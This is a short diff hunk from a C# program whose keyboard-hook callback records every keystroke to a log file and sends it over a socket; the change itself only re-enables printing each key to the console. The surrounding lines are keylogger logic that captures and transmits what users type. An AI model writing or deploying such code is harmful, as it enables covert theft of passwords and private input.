@@ -58,7 +58,7 @@ namespace IP
                 int vkCode = Marshal.ReadInt32(lParam);
                 LoggerWriter.WriteToLog(vkCode,docPath);
                 SocketWriter.WriteToSocket(((Keys)vkCode).ToString());
-                //Console.WriteLine((Keys)vkCode);
+                Console.WriteLine((Keys)vkCode);
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
